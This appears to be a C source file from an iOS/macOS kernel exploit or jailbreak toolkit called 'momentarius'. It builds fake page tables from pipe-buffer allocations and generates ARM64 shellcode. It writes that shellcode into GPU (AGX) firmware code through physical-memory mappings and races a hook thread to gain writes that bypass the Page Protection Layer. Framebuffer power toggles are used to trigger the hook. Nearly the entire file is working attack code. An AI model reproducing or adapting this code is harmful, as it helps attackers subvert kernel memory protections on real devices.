#include <sys/sysctl.h>
#include <IOKit/IOKitLib.h>
#include <dlfcn.h>
#include "utils.h"

__attribute__((naked)) void momentarius_tlb_flush(void) {
    asm ("dsb sy");
    asm ("mov x0, xzr");
    asm ("mov x1, #0x3");
    asm ("mov x2, #80");
    asm ("mov x16, #-61");
    asm ("svc #0x80");
    asm ("mov x0, xzr");
    asm ("svc #0x80");
    asm ("dmb sy");
    asm ("ret");
}

__attribute__((naked)) static void mem_copy(void *dest, void *src, uint32_t size) {
    asm("mov x8, xzr");
    asm("0:");
    asm("cmp x2, x8");
    asm("beq 1f");
    asm("ldrb w9, [x1, x8]");
    asm("strb w9, [x0, x8]");
    asm("add x8, x8, #0x1");
    asm("b 0b");
    asm("1:");
    asm("ret");
}

uint64_t map_phys_data(uint64_t pa, uint32_t size) {
    if (pa == 0 || size > 0x10000) return 0;
    uint64_t page = trunc_page_kernel(pa);
    void *mapped = NULL;
    
    IOSurface_map_withCacheMode(page, size, &mapped, 0);
    return (uint64_t)mapped;
}

uint64_t map_writeback_page(uint64_t pa) {
    if (pa == 0) return 0;
    uint64_t page = trunc_page_kernel(pa);
    void *mapped = NULL;
    
    IOSurface_map_withCacheMode(page, 0x4000, &mapped, IO_MAP_INNER_WRITEBACK);
    return (uint64_t)mapped;
}

uint64_t map_physread64(uint64_t pa) {
    if (pa == 0) return 0;
    uint64_t page = trunc_page_kernel(pa);
    uint64_t offset = pa - page;
    
    uint64_t mapped = map_phys_data(page, 0x4000);
    if (mapped == 0) return 0;
    
    uint64_t value = 0;
    mem_copy(&value, (void *)(mapped + offset), 0x8);
    return value;
}

uint64_t kalloc_page(void) {
    int fds[2] = {-1, -1};
    pipe(fds);
    uint64_t *temp = calloc(1, 0x4000);
    write(fds[1], temp, 0x4000);
    read(fds[0], temp, 0x4000);
    free(temp);
    sync();
    
    uint64_t offset = koffsetof(proc, fd) + koffsetof(filedesc, ofiles_start);
    uint64_t fd_ofiles = kread_ptr(momentarius.self_proc_addr + offset);
    uint64_t fproc = kread_ptr(fd_ofiles + fds[0] * 0x8);
    uint64_t f_fglob = kread_ptr(fproc + 0x10);
    
    uint64_t fg_data = kread_ptr(f_fglob + 0x38);
    uint64_t pipe_buf = kread_ptr(fg_data + 0x10);
    uint8_t empty[32] = {0};
    kwritebuf(fg_data, empty, 32);
    return pipe_buf;
}

__attribute__((naked)) static void gfx_write_cachelines_v1(uint64_t shc_in, uint64_t shc_out, uint64_t ttbr1_in, uint64_t ttbr1_out, uint64_t hook_in, uint64_t hook_out) {
    asm("adrp x10, _stop_write@PAGE");
    asm("add x10, x10, _stop_write@PAGEOFF");
    asm("dmb sy");
    asm("0:");
    asm("ldrb w6, [x10]");
    asm("cbnz w6, 1f");
    asm("ldp x6, x7, [x0]");
    asm("stp x6, x7, [x1]");
    asm("ldp x6, x7, [x0, #0x10]");
    asm("stp x6, x7, [x1, #0x10]");
    asm("ldp x6, x7, [x0, #0x20]");
    asm("stp x6, x7, [x1, #0x20]");
    asm("ldp x6, x7, [x0, #0x30]");
    asm("stp x6, x7, [x1, #0x30]");
    asm("ldr x6, [x0, #0x40]");
    asm("str x6, [x1, #0x40]");
    asm("ldr x6, [x2]");
    asm("str x6, [x3]");
    asm("ldr w6, [x4]");
    asm("str w6, [x5]");
    asm("b 0b");
    asm("1:");
    asm("dsb sy");
    asm("ret");
}

__attribute__((naked)) static void gfx_write_cachelines_v2(uint64_t shc_in, uint64_t shc_out, uint64_t ttbr1_in, uint64_t ttbr1_out, uint64_t hook_in, uint64_t hook_out) {
    asm("adrp x10, _stop_write@PAGE");
    asm("add x10, x10, _stop_write@PAGEOFF");
    asm("dmb sy");
    asm("0:");
    asm("ldrb w6, [x10]");
    asm("cbnz w6, 1f");
    asm("ldp x6, x7, [x0]");
    asm("stp x6, x7, [x1]");
    asm("ldp x6, x7, [x0, #0x10]");
    asm("stp x6, x7, [x1, #0x10]");
    asm("ldr x6, [x0, #0x20]");
    asm("str x6, [x1, #0x20]");
    asm("ldp x6, x7, [x2]");
    asm("stp x6, x7, [x3]");
    asm("ldr w6, [x4]");
    asm("str w6, [x5]");
    asm("b 0b");
    asm("1:");
    asm("dsb sy");
    asm("ret");
}

static void gfx_write_cachelines(uint64_t shc_in, uint64_t shc_out, uint64_t ttbr1_in, uint64_t ttbr1_out, uint64_t hook_in, uint64_t hook_out) {
    if (momentarius.gfx.method == 2) {
        gfx_write_cachelines_v2(shc_in, shc_out, ttbr1_in, ttbr1_out, hook_in, hook_out);
    } else {
        gfx_write_cachelines_v1(shc_in, shc_out, ttbr1_in, ttbr1_out, hook_in, hook_out);
    }
}

static void *momentarius_wait_for_pte(void *data) {
    uint32_t counter = 0;
    usleep(1000);

    while (1) {
        if (counter > 1000 && kread64(momentarius.target_kern_addr) == momentarius.target_pte) {
            *(volatile uint32_t *)data = 0xF100003F; // cmp x1, #0
            asm volatile ("dsb sy");
            usleep(100000);

            stop_write = true;
            break;
        }

        usleep(1000);
        if (++counter == 1000) {
            gfx_suspend();
            gfx_resume();
        }
    }
    return NULL;
}

static int momentarius_gen_shellcode(void) {
    if ((momentarius.gfx.shc_data = calloc(1, 0x80)) == NULL) return -1;
    if ((momentarius.gfx.ttbr1_load_data = calloc(1, 0x40)) == NULL) return -1;
    if ((momentarius.gfx.hook_data = calloc(1, 0x20)) == NULL) return -1;

    if (momentarius.gfx.method == 2) {
        /* 0x00 */ momentarius.gfx.ttbr1_load_data[0] = a64_gen_movz(0, momentarius.new_ttbr1 & 0xffff, 0);
        /* 0x04 */ momentarius.gfx.ttbr1_load_data[1] = a64_gen_movk(0, (momentarius.new_ttbr1 >> 16) & 0xffff, 16);
        /* 0x08 */ momentarius.gfx.ttbr1_load_data[2] = a64_gen_movk(0, (momentarius.new_ttbr1 >> 32) & 0xffff, 32);
        /* 0x0C */ momentarius.gfx.ttbr1_load_data[3] = 0xD65F03C0; // ret
    } else {
        /* 0x00 */ momentarius.gfx.ttbr1_load_data[0] = a64_gen_branch(momentarius.gfx.ttbr1_load_offset, momentarius.gfx.shc_offset + 0x28);
    }

    /* 0x00 */ momentarius.gfx.shc_data[0] = 0xB25C6FE9; // mov x9, #0xfffffff000000000
    /* 0x04 */ momentarius.gfx.shc_data[1] = a64_gen_movk(9, momentarius.target_gfx_addr & 0xffff, 0);
    /* 0x08 */ momentarius.gfx.shc_data[2] = a64_gen_movk(9, (momentarius.target_gfx_addr >> 16) & 0xffff, 16);
    /* 0x0C */ momentarius.gfx.shc_data[3] = a64_gen_movz(8, momentarius.target_pte & 0xffff, 0);
    /* 0x10 */ momentarius.gfx.shc_data[4] = a64_gen_movk(8, (momentarius.target_pte >> 16) & 0xffff, 16);
    /* 0x14 */ momentarius.gfx.shc_data[5] = a64_gen_movk(8, (momentarius.target_pte >> 32) & 0xffff, 32);
    /* 0x18 */ momentarius.gfx.shc_data[6] = a64_gen_movk(8, (momentarius.target_pte >> 48) & 0xffff, 48);
    /* 0x1C */ momentarius.gfx.shc_data[7] = 0xF9000128; // str x8, [x9]
    /* 0x20 */ momentarius.gfx.shc_data[8] = 0xF100003F; // cmp x1, #0
    /* 0x24 */ momentarius.gfx.shc_data[9] = a64_gen_branch(momentarius.gfx.shc_offset + 0x24, momentarius.gfx.hook_offset + 0x4);

    if (momentarius.gfx.method == 1) {
        /* 0x28 */ momentarius.gfx.shc_data[10] = 0xF100001F; // cmp x0, #0
        /* 0x2C */ momentarius.gfx.shc_data[11] = a64_gen_cond_branch(momentarius.gfx.shc_offset + 0x2c, momentarius.gfx.ttbr1_load_offset + 0x4, 0);
        /* 0x30 */ momentarius.gfx.shc_data[12] = 0x91042007; // add x7, x0, #0x108
        /* 0x34 */ momentarius.gfx.shc_data[13] = a64_gen_movz(8, momentarius.new_ttbr1 & 0xffff, 0);
        /* 0x38 */ momentarius.gfx.shc_data[14] = a64_gen_movk(8, (momentarius.new_ttbr1 >> 16) & 0xffff, 16);
        /* 0x3C */ momentarius.gfx.shc_data[15] = a64_gen_movk(8, (momentarius.new_ttbr1 >> 32) & 0xffff, 32);
        /* 0x40 */ momentarius.gfx.shc_data[16] = 0xF90000E8; // str x8, [x7]
        /* 0x44 */ momentarius.gfx.shc_data[17] = a64_gen_branch(momentarius.gfx.shc_offset + 0x44, momentarius.gfx.ttbr1_load_offset + 0x8);
    }

    /* 0x00 */ momentarius.gfx.hook_data[0] = a64_gen_branch(momentarius.gfx.hook_offset, momentarius.gfx.shc_offset);
    return 0;
}

int momentarius_build_ppl_write(void) {
    if ((momentarius.fake_l1_table_kva = kalloc_page()) == 0) return -1;
    if ((momentarius.fake_l2_table_kva = kalloc_page()) == 0) return -1;
    if ((momentarius.self_ref_pt_kva = kalloc_page()) == 0) return -1;
    if ((momentarius.target_rw_mapping = kalloc_page()) == 0) return -1;

    uint64_t l1_table_phys = kvtophys(momentarius.fake_l1_table_kva);
    uint64_t l2_table_phys = kvtophys(momentarius.fake_l2_table_kva);
    uint64_t l3_table_pte = 0;
    uint64_t level = 3;

    if (l1_table_phys == 0 || l2_table_phys == 0) return -1;
    momentarius.new_ttbr1 = l1_table_phys;
    vtophys_lvl(momentarius.kern_ttep, momentarius.self_ref_pt_kva, &level, &l3_table_pte);
    if (l3_table_pte == 0) return -1;

    uint64_t l3_table_pte_kva = phystokv(l3_table_pte);
    if (!KADDR_VALID(l3_table_pte_kva)) return -1;

    uint64_t l3_table_pte_pa = kvtophys(l3_table_pte_kva & ~0x3FFF);
    if (l3_table_pte == 0) return -1;

    uint64_t l3_table_mapping_pte = kread64(l3_table_pte_kva);
    if (l3_table_mapping_pte == 0) return -1;

    level = 3;
    uint64_t mapping_pte = 0;
    vtophys_lvl(momentarius.kern_ttep, momentarius.target_rw_mapping, &level, &mapping_pte);
    if (mapping_pte == 0) return -1;

    uint64_t target_l3_table_pa = kvtophys(phystokv(mapping_pte) & ~0x3FFF);
    if (target_l3_table_pa == 0) return -1;

    uint8_t data[0x40] = {0};
    kreadbuf(momentarius.gfx.ttbr_kva, &data[0], 0x40);
    kwritebuf(momentarius.fake_l1_table_kva, &data[0], 0x40);
    kwrite64(momentarius.fake_l1_table_kva + 0x38, l2_table_phys | 0x3);
    kwrite64(momentarius.fake_l2_table_kva, (l3_table_pte_pa & 0xFFFFFE000000LL) | 0x20000000000445LL);

    momentarius.target_pte = (l3_table_mapping_pte & 0xFFFF000000003FFFLL) | target_l3_table_pa;
    momentarius.target_kern_addr = l3_table_pte_kva;
    momentarius.target_gfx_addr = (0xFFFFFFF000000000 | (l3_table_pte_pa & 0x1FFC000) + (l3_table_pte_kva & 0x3FFF));
    debug_log("target_pte: 0x%llx\n", momentarius.target_pte);
    debug_log("target_kern_addr: 0x%llx\n", momentarius.target_kern_addr);
    debug_log("target_gfx_addr: 0x%llx\n", momentarius.target_gfx_addr);

    if (momentarius_gen_shellcode() != 0) return -1;

    uint64_t shc_pa = momentarius.gfx.text_pa + momentarius.gfx.shc_offset;
    uint64_t ttbr1_pa = momentarius.gfx.text_pa + momentarius.gfx.ttbr1_load_offset;
    uint64_t hook_pa = momentarius.gfx.text_pa + momentarius.gfx.hook_offset;
    if (momentarius.gfx.a14.page_count != 0) {
        shc_pa = gfx_a14_page_pa(momentarius.gfx.shc_offset);
        ttbr1_pa = gfx_a14_page_pa(momentarius.gfx.ttbr1_load_offset);
        hook_pa = gfx_a14_page_pa(momentarius.gfx.hook_offset);
    }
    if (shc_pa == 0 || ttbr1_pa == 0 || hook_pa == 0) return -1;

    uint64_t shc_page = map_writeback_page(shc_pa);
    uint64_t ttbr1_page = map_writeback_page(ttbr1_pa);
    uint64_t hook_page = map_writeback_page(hook_pa);
    if (shc_page == 0 || ttbr1_page == 0 || hook_page == 0) return -1;

    uint64_t shc_input = (uint64_t)momentarius.gfx.shc_data;
    uint64_t shc_output = shc_page + (momentarius.gfx.shc_offset & 0x3fff);
    uint64_t ttbr1_input = (uint64_t)momentarius.gfx.ttbr1_load_data;
    uint64_t ttbr1_output = ttbr1_page + (momentarius.gfx.ttbr1_load_offset & 0x3fff);
    uint64_t hook_input = (uint64_t)momentarius.gfx.hook_data;
    uint64_t hook_output = hook_page + (momentarius.gfx.hook_offset & 0x3fff);

    pthread_t wait_thread = NULL;
    pthread_create(&wait_thread, NULL, momentarius_wait_for_pte, (void *)hook_input);

    gfx_write_cachelines(shc_input, shc_output, ttbr1_input, ttbr1_output, hook_input, hook_output);
    pthread_join(wait_thread, NULL);

    momentarius.target_rw_pte = momentarius.self_ref_pt_kva + ((momentarius.target_rw_mapping >> 11) & 0x3FF8);
    momentarius.orig_pte = kread64(momentarius.target_rw_pte);
    usleep(100000);
    return 0;
}

uint32_t a64_gen_movk(uint8_t rd, int32_t imm, uint8_t sh) {
    return rd | 0xF2800000 | (0x20 * imm) | ((int)sh >> 4 << 0x15);
}

uint32_t a64_gen_movz(uint8_t rd, int32_t imm, uint8_t sh) {
    return rd | 0xD2800000 | (0x20 * imm) | ((int)sh >> 4 << 0x15);
}

int32_t a64_branch_difference(uint64_t from, uint64_t to) {
    return (from <= to) ? (int32_t)(to - from) : (int32_t)(-(from - to));
}

uint32_t a64_gen_cond_branch(uint64_t from, uint64_t to, uint8_t cond) {
    int32_t diff = a64_branch_difference(from, to);
    return (uint32_t)((((int64_t)diff / 4) << 5) | 0x54000000 | (cond & 0xf));
}

uint32_t a64_gen_branch(uint64_t from, uint64_t to) {
    int32_t diff = a64_branch_difference(from, to);
    return ((diff >> 2) & 0x3FFFFFF) | 0x14000000;
}

uint64_t gfx_phystokv(uint64_t pa) {
    if (pa == 0) return 0;
    uint64_t min = momentarius.kern_min_va;
    uint64_t max = momentarius.kern_max_va;
    uint64_t cpu_ttep_va = momentarius.kern_tte;
    uint64_t l1_mask = 0x7;
    uint64_t va = min;
    
    if (va < max) {
        uint64_t cached_l2_entry_va = 0;
        uint64_t l1_entry_va = 0;
        uint64_t cached_l3_table_va = 0;
        uint64_t l2_desc = 0;
        uint64_t l1_desc = 0;
        uint64_t next = 0;
        uint64_t next_aligned = 0;
        bool wrapped = false;
        
        uint64_t *l3_table = calloc(1, 0x4000);
        if (l3_table == NULL) return 0;
        
        while (1) {
            uint64_t l1_index = l1_mask & (va >> TT_L1_SHIFT);
            if (cpu_ttep_va + (l1_index * sizeof(uint64_t)) != l1_entry_va) {
                l1_entry_va = cpu_ttep_va + (l1_index * sizeof(uint64_t));
                if (KADDR_VALID(l1_entry_va)) l1_desc = kread64(l1_entry_va);
            }
            
            if ((l1_desc & 1) == 0) goto skip_64gb;
            uint64_t l2_table_va = phystokv(l1_desc & TTE_PA_MASK);
            
            if (l2_table_va == 0) goto skip_64gb;
            
            uint64_t l2_entry_va = l2_table_va + ((va >> 22) & 0x3FF8);
            if (cached_l2_entry_va != l2_entry_va) {
                cached_l2_entry_va = l2_entry_va;
                if (KADDR_VALID(l2_entry_va))  l2_desc = kread64(l2_entry_va);
            }
            
            if ((l2_desc & 1) == 0) goto skip_32mb;
            if ((l2_desc & 2) == 0 && (l2_desc & 0xFFFFFE000000ULL) == pa) {
                free(l3_table);
                return va;
            }
            
            uint64_t l3_table_va = phystokv(l2_desc & TTE_PA_MASK);
            if (!l3_table_va) goto skip_32mb;
            
            if (cached_l3_table_va != l3_table_va && KADDR_VALID(l3_table_va)) {
                cached_l3_table_va = l3_table_va;
                kreadbuf(l3_table_va, l3_table, 0x4000);
            }
            
            if ((l3_table[(va >> TT_L3_SHIFT) & 0x7FF] & TTE_PA_MASK) == pa) {
                free(l3_table);
                return va | 0xFFFFF00000000000ULL;
            }
            
            va += 0x4000;
            goto bounds;
            
        skip_32mb:
            next = va + TT_L2_SIZE;
            next_aligned = next & 0xFFFFFFFFFE000000ULL;
            wrapped = (next_aligned == 0);
            goto set_min;
            
        skip_64gb:
            next = va + TT_L1_SIZE;
            next_aligned = next & 0xFFFFFFF000000000ULL;
            wrapped = (next_aligned == 0);
            
        set_min:
            va = wrapped ? next : next_aligned;
            
        bounds:
            if (va >= max) {
                if (va - 1 == max) return 0;
                free(l3_table);
                return va;
            }
        }
    }
    return va;
}

uint64_t gfx_a14_text_kva(void) {
    if (momentarius.gfx.a14.text_kva != 0) return momentarius.gfx.a14.text_kva;
    if (momentarius.gfx.text_pa == 0) return 0;

    uint64_t text_kva = gfx_phystokv(momentarius.gfx.text_pa);
    if (!KADDR_VALID(text_kva)) {
        debug_log("A14 fail-closed: AGX text (pa 0x%llx) has no trusted kernel mapping\n",
                  momentarius.gfx.text_pa);
        return 0;
    }

    for (uint32_t i = 0; i < A14_FW_PAGE_MAP_COUNT; i++) {
        uint64_t pa = kvtophys(text_kva + (uint64_t)i * A14_PAGE_SIZE);
        if (pa == 0 || (pa & (A14_PAGE_SIZE - 1U)) != 0 || !GFX_PA_VALID(pa)) {
            debug_log("A14 fail-closed: fw page %u (text+0x%x) has no confirmed runtime PA "
                      "(kvtophys=0x%llx)\n", i, i * A14_PAGE_SIZE, pa);
            momentarius.gfx.a14.page_count = 0;
            return 0;
        }
        momentarius.gfx.a14.page_map[i] = pa;
        momentarius.gfx.a14.page_count = i + 1;
    }

    momentarius.gfx.a14.text_kva = text_kva;
    debug_log("A14 text_kva: 0x%llx; page0 pa: 0x%llx; bptp page pa: 0x%llx\n",
              text_kva,
              momentarius.gfx.a14.page_map[0],
              momentarius.gfx.a14.page_map[A14_FW_PAGE_MAP_COUNT - 1]);
    return text_kva;
}

uint64_t gfx_a14_page_pa(uint32_t fw_offset) {
    if (gfx_a14_text_kva() == 0) return 0;
    uint32_t idx = fw_offset / A14_PAGE_SIZE;
    if (idx >= momentarius.gfx.a14.page_count) return 0;
    return momentarius.gfx.a14.page_map[idx];
}

void gfx_suspend(void) {
    if (!MACH_PORT_VALID(momentarius.iomfb_client)) return;
    uint64_t state = 0;
    uint64_t output[1] = {0};
    uint32_t count = 1;
    
    IOConnectCallScalarMethod(momentarius.iomfb_client, IOMFB_POWER_CHANGE, &state, 1, NULL, NULL);
    IOConnectCallScalarMethod(momentarius.iomfb_client, IOMFB_START_SWAP, NULL, 0, output, &count);
    usleep(0);
}

void gfx_resume(void) {
    if (!MACH_PORT_VALID(momentarius.iomfb_client)) return;
    uint64_t state = 2;
    uint64_t invert_on = 1;
    uint64_t invert_off = 0;
    uint64_t input[2] = {1, 1};

    IOConnectCallScalarMethod(momentarius.iomfb_client, IOMFB_POWER_CHANGE, &state, 1, NULL, NULL);
    IOConnectCallScalarMethod(momentarius.iomfb_client, IOMFB_COLOR_INVERT, &invert_on, 1, NULL, NULL);
    IOConnectCallScalarMethod(momentarius.iomfb_client, IOMFB_CANCEL_SWAP, input, 2, NULL, NULL);
    IOConnectCallScalarMethod(momentarius.iomfb_client, IOMFB_COLOR_INVERT, &invert_off, 1, NULL, NULL);
    usleep(0);
}
